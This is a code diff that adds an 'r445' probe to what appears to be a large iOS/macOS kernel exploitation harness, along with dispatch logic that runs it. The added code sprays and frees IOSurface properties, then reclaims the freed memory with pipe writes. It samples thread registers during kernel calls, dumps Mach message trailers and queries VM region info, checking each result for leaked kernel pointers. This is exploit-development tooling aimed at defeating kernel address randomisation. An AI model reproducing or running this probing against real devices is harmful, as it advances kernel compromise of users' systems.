@@ -16950,6 +16950,446 @@ static void *r440b_read_thread(void *arg) {
     return NULL;
 }
 
+/* r445 thread state snoop helper */
+struct r445_ctx {
+    volatile int ready;
+    volatile int done;
+    IOSurfaceRef surf;
+};
+static void *r445_thread_fn(void *arg) {
+    struct r445_ctx *ctx = (struct r445_ctx *)arg;
+    /* Spin until main thread is ready */
+    while (!ctx->ready) { }
+    /* Perform a heavy IOSurface operation — large property set */
+    char bigval[16384];
+    memset(bigval, 'A', sizeof(bigval));
+    CFDataRef data = CFDataCreate(NULL, (const UInt8*)bigval, sizeof(bigval));
+    for (int i = 0; i < 50; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "r445_big_%d", i);
+        CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+        IOSurfaceSetValue(ctx->surf, ks, data);
+        CFRelease(ks);
+    }
+    CFRelease(data);
+    ctx->done = 1;
+    return NULL;
+}
+
+static void r445_probe(void) {
+    rlog("\n=== r445: Pipe reclaim + thread state snoop + mach trailers ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Pipe buffer reclaim in IOSurface property kalloc zone */
+    rlog("  --- Vector A: Pipe buffer reclaim test ---\n");
+    {
+        /* Strategy: allocate IOSurface properties of specific sizes,
+           free them, then write to pipes hoping to reclaim same memory.
+           Read pipe data back to check for stale kernel metadata. */
+
+        IOSurfaceRef asurf = NULL;
+        {
+            int aw = 32, ah = 32, abr = 128, aa = 4096, apf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef an[5];
+            an[0] = CFNumberCreate(NULL, kCFNumberIntType, &aw);
+            an[1] = CFNumberCreate(NULL, kCFNumberIntType, &ah);
+            an[2] = CFNumberCreate(NULL, kCFNumberIntType, &abr);
+            an[3] = CFNumberCreate(NULL, kCFNumberIntType, &aa);
+            an[4] = CFNumberCreate(NULL, kCFNumberIntType, &apf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), an[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), an[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), an[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), an[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), an[4]);
+            asurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(an[i]);
+        }
+
+        if (asurf) {
+            /* Step 1: Fill 200 properties of size ~128 bytes (kalloc.128 or similar) */
+            rlog("    Step 1: Spraying 200 properties...\n");
+            for (int i = 0; i < 200; i++) {
+                char key[32];
+                snprintf(key, sizeof(key), "pipe_test_%d", i);
+                CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+                /* Value: 96 bytes of 0x41 — total alloc ~128 with overhead */
+                uint8_t val[96];
+                memset(val, 0x41, sizeof(val));
+                CFDataRef dv = CFDataCreate(NULL, val, sizeof(val));
+                IOSurfaceSetValue(asurf, ks, dv);
+                CFRelease(dv);
+                CFRelease(ks);
+            }
+
+            /* Step 2: Create pipes for reclaim */
+            int pipes[100][2];
+            int pipe_count = 0;
+            for (int i = 0; i < 100; i++) {
+                if (pipe(pipes[i]) == 0) pipe_count++;
+                else break;
+            }
+            rlog("    Step 2: Created %d pipe pairs\n", pipe_count);
+
+            /* Step 3: Free all properties (creates holes in kalloc zone) */
+            rlog("    Step 3: Freeing all properties...\n");
+            for (int i = 0; i < 200; i++) {
+                char key[32];
+                snprintf(key, sizeof(key), "pipe_test_%d", i);
+                CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+                IOSurfaceRemoveValue(asurf, ks);
+                CFRelease(ks);
+            }
+
+            /* Step 4: Write to pipes hoping to reclaim freed memory */
+            rlog("    Step 4: Writing to pipes to reclaim freed memory...\n");
+            uint8_t pipe_write_buf[96];
+            memset(pipe_write_buf, 0x42, sizeof(pipe_write_buf));
+            for (int i = 0; i < pipe_count; i++) {
+                write(pipes[i][1], pipe_write_buf, sizeof(pipe_write_buf));
+            }
+
+            /* Step 5: Read from pipes and look for non-0x42 data (stale kernel data) */
+            rlog("    Step 5: Reading pipes, checking for anomalies...\n");
+            int anomalies = 0;
+            int kptr_found = 0;
+            for (int i = 0; i < pipe_count; i++) {
+                uint8_t read_buf[96];
+                ssize_t nr = read(pipes[i][0], read_buf, sizeof(read_buf));
+                if (nr > 0) {
+                    for (ssize_t j = 0; j < nr; j++) {
+                        if (read_buf[j] != 0x42) {
+                            anomalies++;
+                            break;
+                        }
+                    }
+                    /* Check for kernel pointers in read data */
+                    for (ssize_t j = 0; j + 8 <= nr; j += 8) {
+                        uint64_t v;
+                        memcpy(&v, read_buf + j, 8);
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    *** KPTR in pipe[%d] offset %zd: 0x%016llx ***\n",
+                                 i, j, (unsigned long long)v);
+                            kptr_found++;
+                        }
+                    }
+                }
+            }
+            rlog("    Results: %d pipes read, %d anomalies, %d kernel pointers\n",
+                 pipe_count, anomalies, kptr_found);
+
+            for (int i = 0; i < pipe_count; i++) {
+                close(pipes[i][0]);
+                close(pipes[i][1]);
+            }
+            CFRelease(asurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: Thread state snoop during kernel call */
+    rlog("\n  --- Vector B: Thread state snoop during IOSurface ops ---\n");
+    {
+        IOSurfaceRef bsurf = NULL;
+        {
+            int bw = 64, bh = 64, bbr = 256, ba = 16384, bpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef bn[5];
+            bn[0] = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+            bn[1] = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+            bn[2] = CFNumberCreate(NULL, kCFNumberIntType, &bbr);
+            bn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ba);
+            bn[4] = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), bn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), bn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bn[4]);
+            bsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(bn[i]);
+        }
+
+        if (bsurf) {
+            struct r445_ctx ctx;
+            ctx.ready = 0;
+            ctx.done = 0;
+            ctx.surf = bsurf;
+
+            pthread_t worker;
+            pthread_create(&worker, NULL, r445_thread_fn, &ctx);
+
+            /* Get the Mach thread port for the worker */
+            mach_port_t thread_port = pthread_mach_thread_np(worker);
+
+            /* Signal worker to start heavy IO operation */
+            ctx.ready = 1;
+
+            /* Rapidly read the worker's thread state while it's in kernel */
+            int kptr_count = 0;
+            int samples = 0;
+            uint64_t highest_klike = 0;
+
+            while (!ctx.done && samples < 10000) {
+                arm_thread_state64_t state;
+                mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+                kern_return_t kr = thread_get_state(thread_port,
+                    ARM_THREAD_STATE64, (thread_state_t)&state, &count);
+                if (kr == KERN_SUCCESS) {
+                    samples++;
+                    /* Check all general registers for kernel-like values */
+                    uint64_t *regs = (uint64_t *)&state;
+                    for (int i = 0; i < 33; i++) { /* x0-x28, fp, lr, sp, pc */
+                        uint64_t v = regs[i];
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            if (v > highest_klike) highest_klike = v;
+                            kptr_count++;
+                        }
+                    }
+                }
+            }
+
+            pthread_join(worker, NULL);
+            rlog("    Samples: %d, kernel-like values: %d\n", samples, kptr_count);
+            if (highest_klike) {
+                rlog("    *** Highest kernel-like register value: 0x%016llx ***\n",
+                     (unsigned long long)highest_klike);
+            } else {
+                rlog("    No kernel pointers leaked through thread state\n");
+            }
+
+            /* Clean up properties */
+            for (int i = 0; i < 50; i++) {
+                char key[32];
+                snprintf(key, sizeof(key), "r445_big_%d", i);
+                CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII);
+                IOSurfaceRemoveValue(bsurf, ks);
+                CFRelease(ks);
+            }
+            CFRelease(bsurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: Mach message trailer types for kernel data */
+    rlog("\n  --- Vector C: Mach message trailer probe ---\n");
+    {
+        mach_port_t recv_port;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);
+        mach_port_insert_right(mach_task_self(), recv_port, recv_port, MACH_MSG_TYPE_MAKE_SEND);
+
+        /* Send a message with an IOSurface port descriptor */
+        IOSurfaceRef csurf = NULL;
+        {
+            int cw = 32, ch = 32, cbr = 128, ca = 4096, cpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef cn[5];
+            cn[0] = CFNumberCreate(NULL, kCFNumberIntType, &cw);
+            cn[1] = CFNumberCreate(NULL, kCFNumberIntType, &ch);
+            cn[2] = CFNumberCreate(NULL, kCFNumberIntType, &cbr);
+            cn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ca);
+            cn[4] = CFNumberCreate(NULL, kCFNumberIntType, &cpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), cn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), cn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), cn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), cn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), cn[4]);
+            csurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(cn[i]);
+        }
+
+        if (csurf) {
+            mach_port_t surf_port = IOSurfaceCreateMachPort(csurf);
+
+            /* Send a complex message with the port */
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_port_descriptor_t port;
+                uint8_t padding[32];
+            } send_msg;
+            memset(&send_msg, 0, sizeof(send_msg));
+            send_msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+            send_msg.hdr.msgh_size = sizeof(send_msg);
+            send_msg.hdr.msgh_remote_port = recv_port;
+            send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            send_msg.hdr.msgh_id = 0x445;
+            send_msg.body.msgh_descriptor_count = 1;
+            send_msg.port.name = surf_port;
+            send_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
+            send_msg.port.type = MACH_MSG_PORT_DESCRIPTOR;
+
+            kern_return_t kr = mach_msg(&send_msg.hdr, MACH_SEND_MSG, sizeof(send_msg), 0,
+                MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            rlog("    Send msg kr=%d (0=success)\n", kr);
+
+            /* Receive with maximum trailer */
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_port_descriptor_t port;
+                uint8_t padding[32];
+                /* Large trailer buffer */
+                uint8_t trailer[512];
+            } recv_msg;
+            memset(&recv_msg, 0, sizeof(recv_msg));
+
+            /* Try MACH_RCV_TRAILER_AV (audit info) */
+            kr = mach_msg(&recv_msg.hdr, MACH_RCV_MSG | MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) | MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AV),
+                0, sizeof(recv_msg), recv_port, 0, MACH_PORT_NULL);
+            rlog("    Recv msg kr=%d\n", kr);
+
+            if (kr == KERN_SUCCESS) {
+                rlog("    msg_id=%d, size=%d\n", recv_msg.hdr.msgh_id, recv_msg.hdr.msgh_size);
+                rlog("    Received port=0x%x\n", recv_msg.port.name);
+
+                /* Dump trailer area for kernel pointers */
+                uint8_t *trailer_start = (uint8_t*)&recv_msg + recv_msg.hdr.msgh_size;
+                /* Trailer type */
+                mach_msg_trailer_t *trl = (mach_msg_trailer_t*)trailer_start;
+                rlog("    Trailer type=%d, size=%d\n", trl->msgh_trailer_type, trl->msgh_trailer_size);
+
+                /* Dump raw trailer bytes */
+                int trl_size = trl->msgh_trailer_size;
+                if (trl_size > 256) trl_size = 256;
+                rlog("    Trailer raw (%d bytes):\n", trl_size);
+                for (int i = 0; i < trl_size; i += 8) {
+                    uint64_t v;
+                    memcpy(&v, trailer_start + i, 8);
+                    if (v != 0) {
+                        rlog("      +%d: 0x%016llx", i, (unsigned long long)v);
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog(" *** KERNEL PTR ***");
+                        }
+                        rlog("\n");
+                    }
+                }
+
+                /* Clean up received port */
+                mach_port_deallocate(mach_task_self(), recv_msg.port.name);
+            }
+
+            mach_port_deallocate(mach_task_self(), surf_port);
+            CFRelease(csurf);
+        }
+
+        mach_port_destroy(mach_task_self(), recv_port);
+    }
+    fflush(stdout);
+
+    /* Vector D: vm_region on IOSurface shared data mapping */
+    rlog("\n  --- Vector D: vm_region on IOSurface shared memory ---\n");
+    {
+        IOSurfaceRef dsurf = NULL;
+        {
+            int dw = 32, dh = 32, dbr = 128, da = 4096, dpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef dn[5];
+            dn[0] = CFNumberCreate(NULL, kCFNumberIntType, &dw);
+            dn[1] = CFNumberCreate(NULL, kCFNumberIntType, &dh);
+            dn[2] = CFNumberCreate(NULL, kCFNumberIntType, &dbr);
+            dn[3] = CFNumberCreate(NULL, kCFNumberIntType, &da);
+            dn[4] = CFNumberCreate(NULL, kCFNumberIntType, &dpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), dn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), dn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), dn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), dn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), dn[4]);
+            dsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(dn[i]);
+        }
+
+        if (dsurf) {
+            /* Get the shared data pointer */
+            uint64_t *shared_ptr = (uint64_t*)*(void**)((char*)dsurf + 8);
+            uint64_t shared_addr = (uint64_t)shared_ptr;
+            rlog("    Shared data at 0x%llx\n", (unsigned long long)shared_addr);
+
+            /* Use vm_region_recurse on the shared data address */
+            mach_vm_address_t addr = shared_addr;
+            mach_vm_size_t size = 0;
+            natural_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &size,
+                &depth, (vm_region_recurse_info_t)&info, &count);
+            rlog("    vm_region_recurse kr=%d\n", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog("    Region: addr=0x%llx size=0x%llx depth=%u\n",
+                     (unsigned long long)addr, (unsigned long long)size, depth);
+                rlog("    Protection: cur=%d max=%d inherit=%d\n",
+                     info.protection, info.max_protection, info.inheritance);
+                rlog("    Shared=%d, reserved=%d, is_submap=%d\n",
+                     info.share_mode, info.reserved, info.is_submap);
+                rlog("    Object_id=0x%llx, user_tag=%d\n",
+                     (unsigned long long)info.object_id, info.user_tag);
+                rlog("    Offset=0x%llx, pages_resident=%d\n",
+                     (unsigned long long)info.offset, info.pages_resident);
+
+                /* Check if object_id looks like a kernel pointer */
+                if ((info.object_id & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("    *** OBJECT_ID IS KERNEL PTR: 0x%016llx ***\n",
+                         (unsigned long long)info.object_id);
+                }
+            }
+
+            /* Also check the IOSurface backing store region */
+            void *base = IOSurfaceGetBaseAddress(dsurf);
+            IOSurfaceLock(dsurf, 0, NULL);
+            if (base) {
+                addr = (mach_vm_address_t)base;
+                size = 0;
+                depth = 0;
+                count = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kr = mach_vm_region_recurse(mach_task_self(), &addr, &size,
+                    &depth, (vm_region_recurse_info_t)&info, &count);
+                rlog("    Backing store region: kr=%d\n", kr);
+                if (kr == KERN_SUCCESS) {
+                    rlog("    Region: addr=0x%llx size=0x%llx\n",
+                         (unsigned long long)addr, (unsigned long long)size);
+                    rlog("    Object_id=0x%llx, share_mode=%d, user_tag=%d\n",
+                         (unsigned long long)info.object_id, info.share_mode, info.user_tag);
+                    if ((info.object_id & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    *** BACKING OBJECT_ID IS KERNEL PTR: 0x%016llx ***\n",
+                             (unsigned long long)info.object_id);
+                    }
+                }
+            }
+            IOSurfaceUnlock(dsurf, 0, NULL);
+
+            /* Also try mach_vm_page_info on shared data */
+            {
+                r415_page_info_t pinfo;
+                mach_msg_type_number_t pcount = sizeof(pinfo)/sizeof(int);
+                kr = mach_vm_page_info(mach_task_self(), shared_addr, 1, &pinfo, &pcount);
+                rlog("    page_info on shared: kr=%d\n", kr);
+                if (kr == KERN_SUCCESS) {
+                    rlog("    disposition=%d ref_count=%d object_id=0x%llx offset=0x%llx depth=%d\n",
+                         pinfo.disposition, pinfo.ref_count,
+                         (unsigned long long)pinfo.object_id,
+                         (unsigned long long)pinfo.offset, pinfo.depth);
+                    if ((pinfo.object_id & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    *** PAGE_INFO OBJECT_ID IS KERNEL PTR ***\n");
+                    }
+                }
+            }
+
+            CFRelease(dsurf);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r445 complete ===\n");
+    fflush(stdout);
+}
+
 static void r444_probe(void) {
     rlog("\n=== r444: PMC side channel + TLB probe + speculative exec ===\n\n");
     fflush(stdout);
@@ -78792,6 +79232,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 448) {
+            rlog("*** rounds=448: Pipe reclaim + thread state snoop + mach trailers ***\n\n");
+            fflush(stdout);
+            r445_probe();
+            goto done;
+        }
         if (rounds == 447) {
             rlog("*** rounds=447: PMC side channel + timing oracle + dangling port ***\n\n");
             fflush(stdout);
@@ -81500,7 +81946,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
